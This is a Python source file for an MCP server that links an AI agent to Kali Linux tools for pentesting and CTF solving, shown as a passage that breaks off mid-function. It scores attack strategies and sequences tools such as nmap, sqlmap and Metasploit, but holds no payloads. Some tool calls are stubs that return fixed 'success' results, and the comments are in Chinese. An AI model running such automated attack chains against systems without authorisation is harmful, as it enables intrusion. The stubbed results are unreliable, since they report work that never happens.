#!/usr/bin/env python3

# This script connect the MCP AI agent to Kali Linux terminal and API Server.

# some of the code here was inspired from https://github.com/whit3rabbit0/project_astro , be sure to check them out

import sys
import os
import argparse
import logging
from typing import Dict, Any, Optional, List, Tuple
import time
import json
import uuid
import random
import re
from datetime import datetime, timedelta
from dataclasses import dataclass, field, asdict
from enum import Enum

from mcp.server.fastmcp import FastMCP

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# 本地执行模式 - 不需要连接池和结果缓存
OPTIMIZATION_ENABLED = False
logger.info("✅ 本地执行模式 - 直接使用subprocess执行工具")

# 已删除伪智能化CTF引擎导入，现在使用真正的AI智能化MCP工具

# ==================== 会话管理和策略引擎类 ====================

@dataclass
class SessionContext:
    """会话上下文数据类"""
    session_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    target: str = ""
    attack_mode: str = "pentest"  # pentest, ctf, analysis
    start_time: datetime = field(default_factory=datetime.now)
    conversation_history: List[Dict[str, Any]] = field(default_factory=list)
    discovered_assets: Dict[str, Any] = field(default_factory=dict)
    completed_tasks: List[str] = field(default_factory=list)
    current_strategy: Optional[str] = None
    context_metadata: Dict[str, Any] = field(default_factory=dict)
    last_interaction: datetime = field(default_factory=datetime.now)

    def update_interaction(self):
        """更新最后交互时间"""
        self.last_interaction = datetime.now()

    def add_conversation(self, user_message: str, ai_response: str, tools_used: List[str] = None):
        """添加对话历史"""
        self.conversation_history.append({
            "timestamp": datetime.now().isoformat(),
            "user_message": user_message,
            "ai_response": ai_response,
            "tools_used": tools_used or [],
            "session_context": {
                "target": self.target,
                "strategy": self.current_strategy,
                "discovered_assets": len(self.discovered_assets)
            }
        })
        self.update_interaction()

    def get_context_summary(self) -> Dict[str, Any]:
        """获取会话上下文摘要"""
        return {
            "session_id": self.session_id,
            "target": self.target,
            "attack_mode": self.attack_mode,
            "duration": str(datetime.now() - self.start_time),
            "total_conversations": len(self.conversation_history),
            "discovered_assets": len(self.discovered_assets),
            "completed_tasks": len(self.completed_tasks),
            "current_strategy": self.current_strategy,
            "last_interaction": self.last_interaction.isoformat()
        }

class StrategyEngine:
    """策略引擎 - 根据上下文选择最佳攻击策略"""

    def __init__(self):
        self.strategies = {
            "web_comprehensive": {
                "description": "全面Web应用安全测试",
                "tools": ["nmap_scan", "gobuster_scan", "sqlmap_scan", "nuclei_web_scan", "nikto_scan"],
                "conditions": ["web_service_detected", "http_ports_open"],
                "complexity": "high",
                "estimated_time": "30-60 minutes"
            },
            "ctf_quick_solve": {
                "description": "CTF快速解题策略",
                "tools": ["ctf_quick_scan", "ctf_web_attack", "get_detected_flags"],
                "conditions": ["ctf_mode", "time_limited"],
                "complexity": "medium",
                "estimated_time": "5-15 minutes"
            },
            "network_recon": {
                "description": "网络侦察和服务发现",
                "tools": ["nmap_scan", "masscan_scan", "nuclei_network_scan"],
                "conditions": ["ip_target", "network_range"],
                "complexity": "medium",
                "estimated_time": "15-30 minutes"
            },
            "pwn_exploitation": {
                "description": "二进制漏洞利用",
                "tools": ["pwnpasi_auto_pwn", "auto_reverse_analyze", "quick_pwn_check"],
                "conditions": ["binary_file", "pwn_challenge"],
                "complexity": "high",
                "estimated_time": "20-45 minutes"
            },
            "adaptive_multi": {
                "description": "自适应多向量攻击",
                "tools": ["analyze_target_intelligence", "comprehensive_recon", "intelligent_smart_scan"],
                "conditions": ["unknown_target", "complex_environment"],
                "complexity": "very_high",
                "estimated_time": "45-90 minutes"
            }
        }

    def analyze_context(self, session: SessionContext, user_input: str) -> Dict[str, Any]:
        """分析当前上下文并推荐策略"""
        analysis = {
            "context_indicators": [],
            "recommended_strategies": [],
            "confidence_scores": {},
            "target_analysis": {}
        }

        # 分析目标类型
        target = session.target.lower() if session.target else user_input.lower()

        # Web应用指标
        if any(indicator in target for indicator in ["http", "www", ".com", ".org", "web"]):
            analysis["context_indicators"].append("web_service_detected")
            analysis["confidence_scores"]["web_comprehensive"] = 0.8

        # CTF指标
        if any(indicator in user_input.lower() for indicator in ["ctf", "flag", "challenge", "解题"]):
            analysis["context_indicators"].append("ctf_mode")
            analysis["confidence_scores"]["ctf_quick_solve"] = 0.9

        # 二进制文件指标
        if any(indicator in user_input.lower() for indicator in [".exe", "binary", "pwn", "二进制"]):
            analysis["context_indicators"].append("binary_file")
            analysis["confidence_scores"]["pwn_exploitation"] = 0.8

        # IP地址或网络指标
        import re
        ip_pattern = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        if re.search(ip_pattern, target):
            analysis["context_indicators"].append("ip_target")
            analysis["confidence_scores"]["network_recon"] = 0.7

        # 复杂或未知目标
        if len(analysis["context_indicators"]) == 0 or "不知道" in user_input:
            analysis["context_indicators"].append("unknown_target")
            analysis["confidence_scores"]["adaptive_multi"] = 0.6

        # 基于置信度排序策略
        sorted_strategies = sorted(
            analysis["confidence_scores"].items(),
            key=lambda x: x[1],
            reverse=True
        )

        analysis["recommended_strategies"] = [
            {
                "strategy": strategy,
                "confidence": confidence,
                "details": self.strategies.get(strategy, {})
            }
            for strategy, confidence in sorted_strategies[:3]
        ]

        return analysis

    def get_strategy_tools(self, strategy_name: str) -> List[str]:
        """获取策略对应的工具列表"""
        return self.strategies.get(strategy_name, {}).get("tools", [])

    def update_strategy_effectiveness(self, strategy_name: str, success_rate: float):
        """更新策略有效性（机器学习反馈）"""
        if strategy_name in self.strategies:
            if "effectiveness" not in self.strategies[strategy_name]:
                self.strategies[strategy_name]["effectiveness"] = []
            self.strategies[strategy_name]["effectiveness"].append(success_rate)

class AIContextManager:
    """AI上下文管理器 - 管理持续对话状态"""

    def __init__(self):
        self.sessions: Dict[str, SessionContext] = {}
        self.current_session: Optional[SessionContext] = None
        self.strategy_engine = StrategyEngine()
        self.global_knowledge_base = {
            "common_ports": {80: "HTTP", 443: "HTTPS", 22: "SSH", 21: "FTP", 3389: "RDP"},
            "ctf_flag_patterns": [r"flag\{[^}]+\}", r"CTF\{[^}]+\}", r"FLAG\{[^}]+\}"],
            "vulnerability_signatures": {},
            "successful_payloads": {}
        }

    def create_session(self, target: str = "", attack_mode: str = "pentest") -> SessionContext:
        """创建新的会话"""
        session = SessionContext(target=target, attack_mode=attack_mode)
        self.sessions[session.session_id] = session
        self.current_session = session
        logger.info(f"Created new session {session.session_id} for target {target}")
        return session

    def get_or_create_session(self, session_id: str = None) -> SessionContext:
        """获取或创建会话"""
        if session_id and session_id in self.sessions:
            self.current_session = self.sessions[session_id]
            self.current_session.update_interaction()
            return self.current_session
        elif self.current_session:
            self.current_session.update_interaction()
            return self.current_session
        else:
            return self.create_session()

    def analyze_user_intent(self, user_message: str) -> Dict[str, Any]:
        """分析用户意图和上下文"""
        intent_analysis = {
            "primary_intent": "unknown",
            "target_extraction": "",
            "urgency_level": "normal",
            "context_switches": [],
            "tool_suggestions": []
        }

        message_lower = user_message.lower()

        # 意图分析
        if any(word in message_lower for word in ["扫描", "scan", "测试", "test"]):
            intent_analysis["primary_intent"] = "security_testing"
        elif any(word in message_lower for word in ["ctf", "解题", "flag", "challenge"]):
            intent_analysis["primary_intent"] = "ctf_solving"
        elif any(word in message_lower for word in ["分析", "analyze", "逆向", "reverse"]):
            intent_analysis["primary_intent"] = "analysis"
        elif any(word in message_lower for word in ["攻击", "exploit", "利用", "pwn"]):
            intent_analysis["primary_intent"] = "exploitation"

        # 目标提取
        import re
        # URL提取
        url_pattern = r'https?://[^\s]+'
        urls = re.findall(url_pattern, user_message)
        if urls:
            intent_analysis["target_extraction"] = urls[0]

        # IP地址提取
        ip_pattern = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        ips = re.findall(ip_pattern, user_message)
        if ips:
            intent_analysis["target_extraction"] = ips[0]

        # 紧急程度
        if any(word in message_lower for word in ["紧急", "urgent", "快速", "fast", "马上"]):
            intent_analysis["urgency_level"] = "high"
        elif any(word in message_lower for word in ["详细", "comprehensive", "深入", "thorough"]):
            intent_analysis["urgency_level"] = "low"

        return intent_analysis

    def generate_contextual_response(self, session: SessionContext, user_message: str) -> Dict[str, Any]:
        """生成基于上下文的响应建议"""
        intent = self.analyze_user_intent(user_message)
        strategy_analysis = self.strategy_engine.analyze_context(session, user_message)

        response = {
            "session_context": session.get_context_summary(),
            "user_intent": intent,
            "strategy_recommendations": strategy_analysis,
            "contextual_suggestions": [],
            "continuation_options": []
        }

        # 基于历史对话生成建议
        if len(session.conversation_history) > 0:
            last_conversation = session.conversation_history[-1]
            tools_used = last_conversation.get("tools_used", [])

            if "nmap_scan" in tools_used:
                response["continuation_options"].append({
                    "action": "深入服务分析",
                    "description": "基于端口扫描结果进行服务版本检测和漏洞扫描",
                    "tools": ["nuclei_scan", "nikto_scan"]
                })

            if any("sql" in tool for tool in tools_used):
                response["continuation_options"].append({
                    "action": "SQL注入深度利用",
                    "description": "扩大SQL注入攻击面，尝试数据提取和权限提升",
                    "tools": ["sqlmap_scan"]
                })

        # 基于发现的资产生成建议
        for asset_type, assets in session.discovered_assets.items():
            if asset_type == "open_ports" and assets:
                response["contextual_suggestions"].append({
                    "type": "port_analysis",
                    "message": f"发现 {len(assets)} 个开放端口，建议进行服务枚举",
                    "priority": "high"
                })

        return response

    def update_knowledge_base(self, category: str, key: str, value: Any):
        """更新全局知识库"""
        if category not in self.global_knowledge_base:
            self.global_knowledge_base[category] = {}
        self.global_knowledge_base[category][key] = value

    def get_session_insights(self, session_id: str = None) -> Dict[str, Any]:
        """获取会话洞察和建议"""
        session = self.get_or_create_session(session_id)

        insights = {
            "session_summary": session.get_context_summary(),
            "progress_analysis": {
                "completed_phases": len(session.completed_tasks),
                "discovered_assets": len(session.discovered_assets),
                "conversation_depth": len(session.conversation_history)
            },
            "next_recommendations": [],
            "knowledge_gaps": []
        }

        # 分析进展并生成建议
        if len(session.completed_tasks) == 0:
            insights["next_recommendations"].append({
                "action": "开始初始侦察",
                "priority": "high",
                "tools": ["nmap_scan", "analyze_target_intelligence"]
            })
        elif session.target and len(session.discovered_assets) > 0:
            insights["next_recommendations"].append({
                "action": "深入漏洞分析",
                "priority": "medium",
                "tools": ["nuclei_scan", "comprehensive_recon"]
            })

        return insights

# ==================== 智能交互管理器 ====================

class IntelligentInteractionManager:
    """智能交互管理器 - 实现自动工具编排和预测性交互"""

    def __init__(self):
        # 本地执行模式 - 不需要kali_client
        self.current_session = None
        # 已删除伪智能化引擎，现在使用AI智能化MCP工具
        self.auto_mode = True
        self.parallel_execution = True
        self.context_memory = {}

        # 预测性工具映射
        self.tool_sequences = {
            "web_recon": ["nmap_scan", "gobuster_scan", "nuclei_web_scan"],
            "vulnerability_analysis": ["sqlmap_scan", "xss_scanner", "nuclei_scan"],
            "ctf_solve": ["ctf_quick_scan", "get_detected_flags", "ctf_web_attack"],
            "deep_exploitation": ["exploit_search", "metasploit_exploit", "custom_exploit"]
        }

        # 智能决策树
        self.decision_patterns = {
            "port_80_443_open": "web_recon",
            "login_form_detected": "auth_bypass_attempts",
            "ctf_flag_pattern": "ctf_solve",
            "sql_error_detected": "sql_injection_deep",
            "file_upload_found": "upload_bypass_tests"
        }

    async def intelligent_execute(self, user_intent: str, target: str = None, mode: str = "auto") -> Dict[str, Any]:
        """智能执行用户意图，自动选择和编排工具"""

        # 已删除伪智能化引擎初始化，现在使用AI智能化MCP工具

        # 分析用户意图
        intent_analysis = self._analyze_user_intent(user_intent, target)

        # 构建执行计划
        execution_plan = self._build_execution_plan(intent_analysis)

        # 执行智能攻击序列
        results = await self._execute_intelligent_sequence(execution_plan)

        # 分析结果并生成后续建议
        analysis = self._analyze_results_and_predict_next(results)

        return {
            "intent_analysis": intent_analysis,
            "execution_plan": execution_plan,
            "results": results,
            "analysis": analysis,
            "next_recommendations": self._generate_next_steps(analysis),
            "flags_found": self._extract_flags_from_results(results)
        }

    def _analyze_user_intent(self, user_input: str, target: str = None) -> Dict[str, Any]:
        """分析用户意图和上下文"""
        intent = {
            "type": "unknown",
            "target": target,
            "urgency": "normal",
            "scope": "limited",
            "expected_tools": [],
            "context_clues": []
        }

        # CTF意图识别
        ctf_keywords = ["ctf", "flag", "challenge", "capture", "solve"]
        if any(keyword in user_input.lower() for keyword in ctf_keywords):
            intent["type"] = "ctf_solve"
            intent["expected_tools"] = self.tool_sequences["ctf_solve"]
            intent["urgency"] = "high"

        # Web安全测试意图
        web_keywords = ["scan", "test", "vulnerability", "pentest", "security"]
        if any(keyword in user_input.lower() for keyword in web_keywords):
            intent["type"] = "security_assessment"
            intent["expected_tools"] = self.tool_sequences["web_recon"] + self.tool_sequences["vulnerability_analysis"]
            intent["scope"] = "comprehensive"

        # 目标URL检测
        import re
        url_pattern = r'https?://[^\s]+|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        urls = re.findall(url_pattern, user_input)
        if urls:
            intent["target"] = urls[0]
            intent["context_clues"].append(f"目标URL: {urls[0]}")

        # 紧急程度分析
        urgent_keywords = ["直接", "立即", "快速", "马上", "urgent", "immediate"]
        if any(keyword in user_input.lower() for keyword in urgent_keywords):
            intent["urgency"] = "high"

        return intent

    def _build_execution_plan(self, intent_analysis: Dict[str, Any]) -> Dict[str, Any]:
        """基于意图分析构建执行计划"""
        plan = {
            "phase_1": {"name": "初始侦察", "tools": [], "parallel": True},
            "phase_2": {"name": "深度分析", "tools": [], "parallel": True},
            "phase_3": {"name": "漏洞利用", "tools": [], "parallel": False},
            "estimated_time": "5-15分钟",
            "risk_level": "low"
        }

        intent_type = intent_analysis["type"]
        target = intent_analysis["target"]

        # 将目标添加到计划中
        plan["target"] = target

        if intent_type == "ctf_solve":
            # CTF解题计划
            plan["phase_1"]["tools"] = ["intelligent_ctf_analysis", "target_profiling"]
            plan["phase_2"]["tools"] = ["parallel_vulnerability_scan", "flag_pattern_search"]
            plan["phase_3"]["tools"] = ["exploit_discovered_vulnerabilities", "flag_extraction"]
            plan["estimated_time"] = "2-8分钟"
            plan["risk_level"] = "low"

        elif intent_type == "security_assessment":
            # 安全评估计划
            plan["phase_1"]["tools"] = ["nmap_comprehensive", "service_enumeration"]
            plan["phase_2"]["tools"] = ["vulnerability_scanning", "web_analysis"]
            plan["phase_3"]["tools"] = ["safe_exploitation", "report_generation"]
            plan["estimated_time"] = "10-30分钟"
            plan["risk_level"] = "medium"

        # 添加智能化增强
        # 已删除伪智能化功能检查，现在使用AI智能化MCP工具
            plan["intelligent_enhancement"] = True
            plan["parallel_attacks"] = 8
            plan["adaptive_strategy"] = True

        return plan

    async def _execute_intelligent_sequence(self, execution_plan: Dict[str, Any]) -> List[Dict[str, Any]]:
        """执行智能攻击序列"""
        results = []

        # 如果有智能引擎，优先使用
        # 已删除伪智能化引擎，现在使用AI智能化MCP工具
        if False:  # 禁用此功能
            try:
                # 已废弃的伪智能化代码
                    # 获取目标
                    target = execution_plan.get("target") or self.current_session.target

                    if target:
                        # 智能目标分析
                        logger.info("🧠 启动智能目标分析...")
                        profile = await engine.analyze_target(target)

                        # 智能并行攻击
                        logger.info("⚔️ 执行智能并行攻击...")
                        attack_results = await engine.execute_parallel_attacks(profile)

                        # 生成智能报告
                        report = engine.generate_report()

                        results.append({
                            "type": "intelligent_analysis",
                            "target_profile": profile.__dict__,
                            "attack_results": [r.__dict__ for r in attack_results],
                            "intelligence_report": report,
                            "success": True
                        })

                        return results

            except Exception as e:
                logger.error(f"智能引擎执行失败: {e}")

        # 回退到传统工具执行
        for phase_name, phase_info in execution_plan.items():
            if phase_name.startswith("phase_"):
                phase_results = await self._execute_phase(phase_info)
                results.extend(phase_results)

        return results

    async def _execute_phase(self, phase_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """执行单个阶段"""
        results = []
        tools = phase_info.get("tools", [])
        is_parallel = phase_info.get("parallel", False)

        if is_parallel and len(tools) > 1:
            # 并行执行
            import asyncio
            tasks = [self._execute_single_tool(tool) for tool in tools]
            parallel_results = await asyncio.gather(*tasks, return_exceptions=True)

            for result in parallel_results:
                if not isinstance(result, Exception):
                    results.append(result)
        else:
            # 串行执行
            for tool in tools:
                result = await self._execute_single_tool(tool)
                results.append(result)

        return results

    async def _execute_single_tool(self, tool_name: str) -> Dict[str, Any]:
        """执行单个工具"""
        try:
            if tool_name == "intelligent_ctf_analysis":
                return {"tool": tool_name, "result": "智能CTF分析完成", "success": True}
            elif tool_name == "parallel_vulnerability_scan":
                return {"tool": tool_name, "result": "并行漏洞扫描完成", "success": True}
            else:
                # 调用实际的Kali工具
                # 本地执行模式 - 工具通过MCP直接调用
                return {"tool": tool_name, "result": "使用MCP工具调用", "success": True}

        except Exception as e:
            return {"tool": tool_name, "error": str(e), "success": False}

    async def _call_kali_tool(self, tool_name: str) -> str:
        """调用Kali工具"""
        # 这里应该调用实际的Kali工具
        return f"{tool_name} 执行完成"

    def _analyze_results_and_predict_next(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """分析结果并预测下一步"""
        analysis = {
            "success_rate": 0.0,
            "vulnerabilities_found": [],
            "flags_discovered": [],
            "next_attack_vectors": [],
            "confidence_score": 0.0
        }

        successful_results = [r for r in results if r.get("success", False)]
        analysis["success_rate"] = len(successful_results) / len(results) if results else 0

        # 从智能报告中提取信息
        for result in results:
            if result.get("type") == "intelligent_analysis":
                report = result.get("intelligence_report", {})
                analysis["flags_discovered"] = report.get("发现的Flag", [])
                analysis["vulnerabilities_found"] = report.get("漏洞类型", [])
                analysis["confidence_score"] = report.get("成功率", 0.0)

        return analysis

    def _generate_next_steps(self, analysis: Dict[str, Any]) -> List[Dict[str, str]]:
        """生成下一步建议"""
        recommendations = []

        if analysis["flags_discovered"]:
            recommendations.append({
                "action": "验证发现的Flag",
                "priority": "high",
                "description": f"发现 {len(analysis['flags_discovered'])} 个Flag，建议验证和提交"
            })
        elif analysis["vulnerabilities_found"]:
            recommendations.append({
                "action": "深度漏洞利用",
                "priority": "medium",
                "description": f"发现 {len(analysis['vulnerabilities_found'])} 个漏洞类型，建议深度利用"
            })
        else:
            recommendations.append({
                "action": "扩大攻击面",
                "priority": "medium",
                "description": "当前攻击未成功，建议尝试其他攻击向量"
            })

        return recommendations

    def _extract_flags_from_results(self, results: List[Dict[str, Any]]) -> List[str]:
        """从结果中提取flag"""
        flags = []

        for result in results:
            if result.get("type") == "intelligent_analysis":
                report = result.get("intelligence_report", {})
                flags.extend(report.get("发现的Flag", []))

        return list(set(flags))  # 去重

# ==================== 机器学习策略优化引擎 ====================

class MLStrategyOptimizer:
    """机器学习策略优化引擎 - 基于历史数据和实时反馈优化攻击策略"""

    def __init__(self):
        self.strategy_performance_history = {}
        self.target_type_patterns = {}
        self.success_factors = {}
        self.learning_rate = 0.1
        self.confidence_threshold = 0.7

        # 初始化策略权重矩阵
        self.strategy_weights = {
            "web_comprehensive": {
                "port_diversity": 0.3,
                "service_versions": 0.25,
                "response_time": 0.2,
                "vulnerability_history": 0.25
            },
            "ctf_quick_solve": {
                "time_constraint": 0.4,
                "flag_pattern_match": 0.3,
                "tool_efficiency": 0.3
            },
            "network_recon": {
                "network_size": 0.35,
                "response_rate": 0.25,
                "service_diversity": 0.4
            },
            "pwn_exploitation": {
                "binary_complexity": 0.3,
                "mitigation_presence": 0.3,
                "exploit_availability": 0.4
            },
            "adaptive_multi": {
                "environment_complexity": 0.25,
                "tool_synergy": 0.3,
                "discovery_rate": 0.45
            }
        }

        # 向量存储系统用于相似性匹配
        self.target_vectors = {}
        self.strategy_embeddings = {}

    def vectorize_target_characteristics(self, session: SessionContext, scan_results: Dict[str, Any] = None) -> List[float]:
        """将目标特征向量化用于ML分析"""
        features = [0.0] * 20  # 20维特征向量

        # 基础目标特征 (0-4)
        target = session.target.lower() if session.target else ""
        features[0] = 1.0 if any(web_indicator in target for web_indicator in ["http", "www", ".com"]) else 0.0
        features[1] = 1.0 if re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', target) else 0.0
        features[2] = len(session.discovered_assets) / 10.0  # 标准化发现的资产数量
        features[3] = len(session.conversation_history) / 20.0  # 标准化对话深度
        features[4] = 1.0 if session.attack_mode == "ctf" else 0.0

        # 扫描结果特征 (5-12)
        if scan_results:
            open_ports = scan_results.get("open_ports", [])
            features[5] = len(open_ports) / 100.0  # 标准化端口数量
            features[6] = 1.0 if any(port in [80, 443, 8080] for port in open_ports) else 0.0  # Web服务
            features[7] = 1.0 if any(port in [21, 22, 23, 25] for port in open_ports) else 0.0  # 传统服务
            features[8] = 1.0 if any(port in [1433, 3306, 5432] for port in open_ports) else 0.0  # 数据库
            features[9] = scan_results.get("vulnerability_count", 0) / 50.0  # 标准化漏洞数量
            features[10] = 1.0 if scan_results.get("waf_detected", False) else 0.0  # WAF检测
            features[11] = scan_results.get("response_time_avg", 0) / 1000.0  # 标准化响应时间
            features[12] = 1.0 if scan_results.get("ssl_enabled", False) else 0.0  # SSL状态

        # 时间特征 (13-16)
        session_duration = (datetime.now() - session.start_time).total_seconds()
        features[13] = min(session_duration / 3600, 1.0)  # 会话持续时间(小时)
        features[14] = 1.0 if datetime.now().hour < 6 or datetime.now().hour > 22 else 0.0  # 夜间测试
        features[15] = len(session.completed_tasks) / 10.0  # 标准化已完成任务
        features[16] = 1.0 if any("urgent" in msg.get("user_message", "").lower()
                                for msg in session.conversation_history) else 0.0  # 紧急程度

        # 高级特征 (17-19)
        features[17] = self._calculate_environment_complexity(session)
        features[18] = self._calculate_success_probability(session)
        features[19] = self._calculate_resource_efficiency(session)

        return features

    def _calculate_environment_complexity(self, session: SessionContext) -> float:
        """计算环境复杂度"""
        complexity_score = 0.0

        # 基于发现的服务数量
        service_count = len(session.discovered_assets.get("services", []))
        complexity_score += min(service_count / 20.0, 0.4)

        # 基于交互历史复杂度
        conversation_complexity = len(set(tool for conv in session.conversation_history
                                        for tool in conv.get("tools_used", [])))
        complexity_score += min(conversation_complexity / 15.0, 0.3)

        # 基于目标多样性
        if session.target and ("/" in session.target or ":" in session.target):
            complexity_score += 0.3

        return min(complexity_score, 1.0)

    def _calculate_success_probability(self, session: SessionContext) -> float:
        """基于历史数据计算成功概率"""
        if not session.current_strategy:
            return 0.5  # 默认50%

        strategy_history = self.strategy_performance_history.get(session.current_strategy, [])
        if not strategy_history:
            return 0.5

        # 计算历史成功率
        recent_performances = strategy_history[-10:]  # 最近10次
        avg_success = sum(recent_performances) / len(recent_performances)

        # 考虑目标相似性调整
        target_type = self._classify_target_type(session.target)
        type_modifier = self.target_type_patterns.get(target_type, {}).get(session.current_strategy, 1.0)

        return min(avg_success * type_modifier, 1.0)

    def _calculate_resource_efficiency(self, session: SessionContext) -> float:
        """计算资源效率分数"""
        if not session.conversation_history:
            return 0.5

        total_tools_used = sum(len(conv.get("tools_used", [])) for conv in session.conversation_history)
        discoveries_made = len(session.discovered_assets)

        if total_tools_used == 0:
            return 0.0

        efficiency = discoveries_made / total_tools_used
        return min(efficiency, 1.0)

    def _classify_target_type(self, target: str) -> str:
        """分类目标类型"""
        if not target:
            return "unknown"

        target_lower = target.lower()

        if any(indicator in target_lower for indicator in ["http", "www", ".com", ".org"]):
            return "web_application"
        elif re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', target):
            return "ip_address"
        elif any(indicator in target_lower for indicator in [".exe", ".bin"]):
            return "binary_file"
        elif "/" in target or ":" in target:
            return "complex_endpoint"
        else:
            return "unknown"

    def predict_optimal_strategy(self, session: SessionContext, user_intent: Dict[str, Any],
                                scan_results: Dict[str, Any] = None) -> Dict[str, Any]:
        """基于ML预测最优策略"""

        # 特征向量化
        feature_vector = self.vectorize_target_characteristics(session, scan_results)

        # 计算每个策略的适配分数
        strategy_scores = {}

        for strategy_name, weights in self.strategy_weights.items():
            base_score = self._calculate_base_strategy_score(strategy_name, feature_vector, weights)

            # 历史性能调整
            historical_performance = self._get_historical_performance(strategy_name, session)

            # 上下文相似性调整
            similarity_bonus = self._calculate_context_similarity(strategy_name, session)

            # 实时学习调整
            learning_adjustment = self._get_learning_adjustment(strategy_name, user_intent)

            final_score = (base_score * 0.4 +
                          historical_performance * 0.3 +
                          similarity_bonus * 0.2 +
                          learning_adjustment * 0.1)

            strategy_scores[strategy_name] = {
                "total_score": final_score,
                "base_score": base_score,
                "historical_performance": historical_performance,
                "similarity_bonus": similarity_bonus,
                "learning_adjustment": learning_adjustment,
                "confidence": self._calculate_confidence(final_score, strategy_name)
            }

        # 排序并返回推荐
        sorted_strategies = sorted(strategy_scores.items(), key=lambda x: x[1]["total_score"], reverse=True)

        return {
            "recommended_strategy": sorted_strategies[0][0] if sorted_strategies else "adaptive_multi",
            "confidence": sorted_strategies[0][1]["confidence"] if sorted_strategies else 0.5,
            "alternative_strategies": [
                {
                    "strategy": strategy,
                    "score": details["total_score"],
                    "confidence": details["confidence"],
                    "reasoning": self._generate_strategy_reasoning(strategy, details)
                }
                for strategy, details in sorted_strategies[1:4]
            ],
            "feature_analysis": {
                "primary_factors": self._identify_primary_factors(feature_vector),
                "risk_assessment": self._assess_risk_level(feature_vector),
                "resource_estimation": self._estimate_resource_requirements(sorted_strategies[0][0] if sorted_strategies else "adaptive_multi")
            }
        }

    def _calculate_base_strategy_score(self, strategy_name: str, features: List[float], weights: Dict[str, float]) -> float:
        """计算策略基础分数"""
        score = 0.0

        if strategy_name == "web_comprehensive":
            score = (features[0] * weights["port_diversity"] +  # Web指标
                    features[6] * weights["service_versions"] +   # Web服务
                    features[11] * weights["response_time"] +     # 响应时间
                    features[9] * weights["vulnerability_history"])  # 漏洞数量

        elif strategy_name == "ctf_quick_solve":
            score = (features[4] * weights["time_constraint"] +   # CTF模式
                    features[16] * weights["flag_pattern_match"] +  # 紧急程度
                    features[19] * weights["tool_efficiency"])      # 资源效率

        elif strategy_name == "network_recon":
            score = (features[1] * weights["network_size"] +      # IP目标
                    features[5] * weights["response_rate"] +       # 端口数量
                    features[7] * weights["service_diversity"])    # 传统服务

        elif strategy_name == "pwn_exploitation":
            score = (features[17] * weights["binary_complexity"] +  # 环境复杂度
                    features[10] * weights["mitigation_presence"] +  # WAF检测
                    features[18] * weights["exploit_availability"])  # 成功概率

        elif strategy_name == "adaptive_multi":
            score = (features[17] * weights["environment_complexity"] +  # 环境复杂度
                    features[2] * weights["tool_synergy"] +              # 发现资产
                    features[15] * weights["discovery_rate"])            # 完成任务

        return min(max(score, 0.0), 1.0)

    def _get_historical_performance(self, strategy_name: str, session: SessionContext) -> float:
        """获取历史性能分数"""
        target_type = self._classify_target_type(session.target)

        # 获取策略历史记录
        strategy_history = self.strategy_performance_history.get(strategy_name, [])

        if not strategy_history:
            return 0.5  # 默认中等表现

        # 获取目标类型特定的表现
        type_specific = self.target_type_patterns.get(target_type, {}).get(strategy_name, [])

        if type_specific:
            recent_performance = sum(type_specific[-5:]) / len(type_specific[-5:])
        else:
            recent_performance = sum(strategy_history[-10:]) / len(strategy_history[-10:])

        return recent_performance

    def _calculate_context_similarity(self, strategy_name: str, session: SessionContext) -> float:
        """计算上下文相似性奖励"""
        current_context = {
            "target_type": self._classify_target_type(session.target),
            "attack_mode": session.attack_mode,
            "session_depth": len(session.conversation_history),
            "discoveries": len(session.discovered_assets)
        }

        # 查找相似的历史上下文
        similarity_scores = []

        for stored_context in self.target_vectors.values():
            if stored_context.get("successful_strategy") == strategy_name:
                similarity = self._calculate_context_cosine_similarity(current_context, stored_context)
                similarity_scores.append(similarity)

        if similarity_scores:
            return sum(similarity_scores) / len(similarity_scores)

        return 0.0

    def _calculate_context_cosine_similarity(self, ctx1: Dict, ctx2: Dict) -> float:
        """计算上下文余弦相似度"""
        # 简化的相似度计算
        score = 0.0
        total_factors = 0

        if ctx1.get("target_type") == ctx2.get("target_type"):
            score += 0.4
        total_factors += 1

        if ctx1.get("attack_mode") == ctx2.get("attack_mode"):
            score += 0.3
        total_factors += 1

        # 数值特征的相似度
        depth_diff = abs(ctx1.get("session_depth", 0) - ctx2.get("session_depth", 0))
        depth_similarity = max(0, 1 - depth_diff / 20.0)
        score += depth_similarity * 0.3
        total_factors += 1

        return score / total_factors if total_factors > 0 else 0.0

    def _get_learning_adjustment(self, strategy_name: str, user_intent: Dict[str, Any]) -> float:
        """获取实时学习调整分数"""
        adjustment = 0.0

        # 基于用户意图调整
        intent = user_intent.get("primary_intent", "")
        urgency = user_intent.get("urgency_level", "normal")

        if intent == "security_testing" and strategy_name in ["web_comprehensive", "network_recon"]:
            adjustment += 0.2
        elif intent == "ctf_solving" and strategy_name == "ctf_quick_solve":
            adjustment += 0.3
        elif intent == "exploitation" and strategy_name in ["pwn_exploitation", "adaptive_multi"]:
            adjustment += 0.25

        # 基于紧急程度调整
        if urgency == "high" and strategy_name in ["ctf_quick_solve", "network_recon"]:
            adjustment += 0.15
        elif urgency == "low" and strategy_name in ["web_comprehensive", "adaptive_multi"]:
            adjustment += 0.1

        return min(adjustment, 0.5)

    def _calculate_confidence(self, score: float, strategy_name: str) -> float:
        """计算推荐置信度"""
        base_confidence = score

        # 基于历史数据量调整置信度
        history_count = len(self.strategy_performance_history.get(strategy_name, []))
        history_bonus = min(history_count / 50.0, 0.2)  # 最多20%奖励

        # 基于策略复杂度调整
        complexity_penalty = {
            "ctf_quick_solve": 0.0,
            "network_recon": 0.05,
            "web_comprehensive": 0.1,
            "pwn_exploitation": 0.15,
            "adaptive_multi": 0.2
        }.get(strategy_name, 0.1)

        final_confidence = base_confidence + history_bonus - complexity_penalty
        return max(min(final_confidence, 1.0), 0.0)

    def _generate_strategy_reasoning(self, strategy_name: str, details: Dict[str, Any]) -> str:
        """生成策略推荐理由"""
        reasoning_parts = []

        if details["base_score"] > 0.7:
